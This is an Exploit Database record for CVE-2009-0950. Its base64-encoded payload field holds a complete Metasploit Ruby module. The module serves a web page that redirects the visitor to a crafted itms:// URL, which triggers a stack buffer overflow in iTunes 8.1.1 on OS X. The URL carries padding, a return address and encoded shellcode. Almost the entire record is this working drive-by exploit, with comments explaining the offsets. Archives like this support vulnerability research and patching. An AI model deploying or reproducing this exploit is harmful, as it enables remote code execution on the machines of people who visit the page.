{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgJElkOiAkDQojIw0KDQojIw0KIyBUaGlzIGZpbGUgaXMgcGFydCBvZiB0aGUgTWV0YXNwbG9pdCBGcmFtZXdvcmsgYW5kIG1heSBiZSBzdWJqZWN0IHRvDQojIHJlZGlzdHJpYnV0aW9uIGFuZCBjb21tZXJjaWFsIHJlc3RyaWN0aW9ucy4gUGxlYXNlIHNlZSB0aGUgTWV0YXNwbG9pdA0KIyBGcmFtZXdvcmsgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojIGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9wcm9qZWN0cy9GcmFtZXdvcmsvDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQoNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwU2VydmVyOjpIVE1MDQoNCglkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQoJCXN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQoJCQknTmFtZScgICAgICAgICAgID0+ICdBcHBsZSBPUyBYIGlUdW5lcyA4LjEuMSBJVE1TIE92ZXJmbG93JywNCgkJCSdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQoJCQkJVGhpcyBtb2R1bGVzIGV4cGxvaXRzIGEgc3RhY2stYmFzZWQgYnVmZmVyIG92ZXJmbG93IGluIGlUdW5lcw0KCQkJCWl0bXM6Ly8gVVJMIHBhcnNpbmcuICAgSXQgaXMgYWNjZXNzaWJsZSBmcm9tIHRoZSBicm93c2VyIGFuZA0KCQkJCWluIFNhZmFyaSwgaXRtcyB1cmxzIHdpbGwgYmUgb3BlbmVkIGluIGlUdW5lcyBhdXRvbWF0aWNhbGx5Lg0KCQkJCUJlY2F1c2UgaVR1bmVzIGlzIG11bHRpdGhyZWFkZWQsIG9ubHkgdmZvcmstYmFzZWQgcGF5bG9hZHMgc2hvdWxkDQoJCQkJYmUgdXNlZC4NCgkJCX0sDQoJCQknQXV0aG9yJyAgICAgICAgID0+IFsgJ1dpbGwgRHJld3J5IDxyZWRwaWdAZGF0YXNwaWxsLm9yZz4nIF0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ1ZlcnNpb24nICAgICAgICA9PiAnJFJldmlzaW9uOiAgJCcsDQoJCQknUmVmZXJlbmNlcycgICAgID0+DQoJCQkJWw0KCQkJCQlbJ0NWRScsICdDVkUtMjAwOS0wOTUwJ10sDQoJCQkJCVsnVVJMJywgJ2h0dHA6Ly9zdXBwb3J0LmFwcGxlLmNvbS9rYi9IVDM1OTInXSwNCgkJCQkJWydVUkwnLCAnaHR0cDovL3JlZHBpZy5kYXRhc3BpbGwub3JnLzIwMDkvMDUvZHJpdmUtYnktYXR0YWNrLWZvci1pdHVuZXMtODExLmh0bWwnXSwNCgkJCQldLA0KCQkJJ1BheWxvYWQnICAgICAgICA9Pg0KCQkJCXsNCgkJCQkJJ1NwYWNlJyAgICAgICA9PiAxMDI0LCAgIyByb3VnaCBlc3RpbWF0ZSBvZiB3aGF0IGJyb3dzZXJzIHdpbGwgcGFzcy4NCgkJCQkJJ0Rpc2FibGVOb3BzJyA9PiB0cnVlLCAgIyBkb24ndCBwYWQgb3V0IHRoZSBzcGFjZS4NCgkJCQkJJ0JhZENoYXJzJyA9PiAnJywNCgkJCQkJIyBUaGUgZW5jb2RlciBtdXN0IGJlIFVSTC1zYWZlIG90aGVyd2lzZSBpdCB3aWxsIGJlIGF1dG9tYXRpY2FsbHkNCgkJCQkJIyBVUkwgZW5jb2RlZC4NCgkJCQkJJ0VuY29kZXJUeXBlJyAgID0+IE1zZjo6RW5jb2Rlcjo6VHlwZTo6QWxwaGFudW1NaXhlZCwNCgkJCQkJJ0VuY29kZXJPcHRpb25zJyA9Pg0KCQkJCQkJew0KCQkJCQkJCSdCdWZmZXJSZWdpc3RlcicgPT4gJ0VDWCcsICAjIFNlZSB0aGUgY29tbWVudHMgYmVsb3cNCgkJCQkJCQknQnVmZmVyT2Zmc2V0JyA9PiAzLCAgIyBTZWUgdGhlIGNvbW1lbnRzIGJlbG93DQoJCQkJCQl9LA0KCQkJCX0sDQoJCQknVGFyZ2V0cycJPT4NCgkJCQlbDQoJCQkJCVsNCgkJCQkJCSdPUyBYJywNCgkJCQkJCXsNCgkJCQkJCQknUGxhdGZvcm0nICAgICAgPT4gWyAnb3N4JyBdLA0KCQkJCQkJCSdBcmNoJyAgICAgICAgICA9PiBBUkNIX1g4NiwNCgkJCQkJCQknQWRkcicgICAgICAgICAgPT4gJ0FUZScNCgkJCQkJCX0sDQoJCQkJCSBdLA0KCQkJCQlbDQoJCQkJCQknV2luZG93cyAobm90IGRvbmUgeWV0KScsDQoJCQkJCQl7DQoJCQkJCQkJJ1BsYXRmb3JtJyAgICAgID0+IFsgJ3dpbicgXSwNCgkJCQkJCQknQXJjaCcgICAgICAgICAgPT4gQVJDSF9YODYsDQoJCQkJCQkJJ0FkZHInICAgICAgICAgID0+ICdDQ0NDJw0KCQkJCQkJfSwNCgkJCQkJIF0sDQoJCQkJXSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gJ0p1bmUgMSwgMjAwOScsDQoJCQknRGVmYXVsdFRhcmdldCcgID0+IDApKQ0KDQoJCXJlZ2lzdGVyX29wdGlvbnMoDQoJCQlbDQoJCQkJT3B0UG9ydC5uZXcoJ1NSVlBPUlQnLCBbIHRydWUsICJUaGUgbG9jYWwgcG9ydCB0byBsaXN0ZW4gb24uIiwgODAgXSksDQoJCQkJT3B0U3RyaW5nLm5ldygnVVJJUEFUSCcsIFsgdHJ1ZSwgIlRoZSBVUkkgdG8gdXNlIGZvciB0aGlzIGV4cGxvaXQuIiwgIi8iIF0pDQoJCQldLCBzZWxmLmNsYXNzKQ0KCWVuZA0KDQoJIyBHZW5lcmF0ZSBkaXN0cmlidXRpb24gc2NyaXB0LCB3aGljaCBjYWxscyBvdXIgcGF5bG9hZCB1c2luZyBKYXZhU2NyaXB0Lg0KCWRlZiBnZW5lcmF0ZV9pdG1zX3BhZ2UocCkNCgkJIyBTZXQgdGhlIGJhc2UgaXRtcyB1cmwuDQoJCSMgaXRtczovLyBvciBpdG1zczovLyBjYW4gYmUgdXNlZC4gIFRoZSB0cmFpbGluZyBjb2xvbiBpcyB1c2VkDQoJCSMgdG8gc3RhcnQgdGhlIGF0dGFjay4gIEFsbCBkYXRhIGFmdGVyIHRoZSBjb2xvbiBpcyBjb3BpZWQgdG8gdGhlDQoJCSMgc3RhY2sgYnVmZmVyLg0KCQlpdG1zX2Jhc2VfdXJsID0gIml0bXM6Ly86Ig0KCQlpdG1zX2Jhc2VfdXJsIDw8ICJBIioyNjggICMgRmlsbCB1cCB0aGUgcmVhbCBidWZmZXINCgkJaXRtc19iYXNlX3VybCA8PCAiWFhYWEFBQUFaWlpaWVlZWSIgICMgJGVieCwgJGVzaSwgJGVkaSwgJGVicA0KCQlpdG1zX2Jhc2VfdXJsIDw8IHRhcmdldFsnQWRkciddICAjIGh1bGxvIHRoZXJlLCBqbXAgKiVlY3ghDQoJCSMgVGhlIGZpcnN0ICcvJyBpbiB0aGUgYnVmZmVyIHdpbGwgdGVybWluYXRlIHRoZSBjb3B5IHRvIHRoZSBzdGFjayBidWZmZXIuDQoJCSMgSW4gYWRkaXRpb24sICRlY3ggd2lsbCBiZSBsZWZ0IHBvaW50aW5nIHRvIHRoZSBsYXN0IDYgYnl0ZXMgb2YgdGhlIGhlYXANCgkJIyBidWZmZXIgY29udGFpbmluZyB0aGUgZnVsbCBVUkwuICBIb3dldmVyLCBpZiBhIGNvbG9uIGFuZCBhID8gb2NjdXIgYWZ0ZXINCgkJIyB0aGUgdmFsdWUgaW4gZWN4IHdpbGwgcG9pbnQgdG8gdGhhdCBwb2ludCBpbiB0aGUgaGVhcCBidWZmZXIuICBJbiBvdXINCgkJIyBjYXNlLCBpdCB3aWxsIHBvaW50IHRvIHRoZSBiZWdpbm5pbmcuICBUaGUgISBpcyB0aGVyZSB0byBtYWtlIHRoZQ0KCQkjIGFscGhhbnVtZXJpYyBzaGVsbGNvZGUgZXhlY3V0ZSBlYXNpbHkuICAoVGhpcyBpcyB3aHkgd2UgbmVlZCBhbiBvZmZzZXQNCgkJIyBvZiAzIGluIHRoZSBwYXlsb2FkKS4NCgkJaXRtc19iYXNlX3VybCA8PCAiLzohPyIgICAjIFRydW5jYXRlIHRoZSBzdGFjayBvdmVyZmxvdyBhbmQgcHJlcCBmb3IgcGF5bG9hZA0KCQlpdG1zX2Jhc2VfdXJsIDw8IHAgIyBXb29vb29vbyEgUGF5bG9hZCB0aW1lLg0KCQkjIFdlIGRyb3Agb24gYSBmZXcgZXh0cmEgYnl0ZXMgYXMgdGhlIGxhc3QgZmV3IGJ5dGVzIGNhbiBzb21ldGltZXMgYmUNCgkJIyBjb3JydXB0ZWQuDQoJCWl0bXNfYmFzZV91cmwgPDwgIkFBQUEiDQoNCgkJIyBVc2UgdGhlIHBhdHRlcm4gY3JlYXRvciB0byBzaW1wbGlmeSBleHBsb2l0IGNyZWF0aW9uIDopDQoJCSMgaXRtc19iYXNlX3VybCA8PCBSZXg6OlRleHQucGF0dGVybl9jcmVhdGUoMTAyNCwNCgkJIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXg6OlRleHQ6OkRlZmF1bHRQYXR0ZXJuU2V0cykNCg0KCQkjIFJldHVybiBiYWNrIGFuIGV4YW1wbGUgVVJMLiAgVXNpbmcgYW4gaWZyYW1lIGRvZXNuJ3Qgd29yayB3aXRoIGFsbA0KCQkjIGJyb3dzZXJzLCBidXQgdGhhdCdzIGVhc3kgZW5vdWdoIHRvIGZpeCBpZiB5b3UgbmVlZCB0by4NCgkJcmV0dXJuIFN0cmluZyg8PC1FT1MpDQoJCTxodG1sPjxoZWFkPjx0aXRsZT5pVHVuZXMgbG9hZGluZyAuIC4gLjwvdGl0bGU+PC9oZWFkPg0KCQkgIDxib2R5Pg0KCQkgICAgPHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbi5hc3NpZ24oIiN7aXRtc19iYXNlX3VybH0iKTs8L3NjcmlwdD4NCgkJICAgIDxwPmlUdW5lcyBzaG91bGQgb3BlbiBhdXRvbWF0aWNhbGx5LCBidXQgaWYgaXQgZG9lc24ndCwgY2xpY2sgdG8NCgkJICAgICAgPGEgaHJlZj0iI3tpdG1zX2Jhc2VfdXJsfSI+Y29udGludWU8L2E+LjwvcD4NCgkJICA8L2JvZHk+DQoJCTwvaHRtbD4NCgkJRU9TDQoJZW5kDQoNCglkZWYgb25fcmVxdWVzdF91cmkoY2xpLCByZXF1ZXN0KQ0KCQlwcmludF9zdGF0dXMoIkdlbmVyYXRpbmcgcGF5bG9hZC4uLiIpDQoJCXJldHVybiB1bmxlc3MgKHAgPSByZWdlbmVyYXRlX3BheWxvYWQoY2xpKSkNCgkJI3ByaW50X3N0YXR1cygiPT4gI3twYXlsb2FkLmVuY29kZWR9IikNCgkJcHJpbnRfc3RhdHVzKCI9PiAje3BheWxvYWQuZW5jb2RlZC5sZW5ndGh9IGJ5dGVzIikNCg0KCQlwcmludF9zdGF0dXMoIkdlbmVyYXRpbmcgSFRNTCBjb250YWluZXIuLi4iKQ0KCQlwYWdlID0gZ2VuZXJhdGVfaXRtc19wYWdlKHBheWxvYWQuZW5jb2RlZCkNCgkJI3ByaW50X3N0YXR1cygiPT4gI3twYWdlfSIpDQoJCXByaW50X3N0YXR1cygiU2VuZGluZyBpdG1zIHBhZ2UgdG8gI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fSIpDQoNCgkJaGVhZGVyID0geyAnQ29udGVudC1UeXBlJyA9PiAndGV4dC9odG1sJyB9DQoJCXNlbmRfcmVzcG9uc2VfaHRtbChjbGksIHBhZ2UsIGhlYWRlcikNCgkJaGFuZGxlcihjbGkpDQoJZW5kDQoNCmVuZA0KDQojIG1pbHcwcm0uY29tIFsyMDA5LTA2LTAzXQ==", 
    "filename": "platforms/osx/remote/8861.rb", 
    "id": "8861", 
    "cves": [
        "CVE-2009-0950"
    ]
}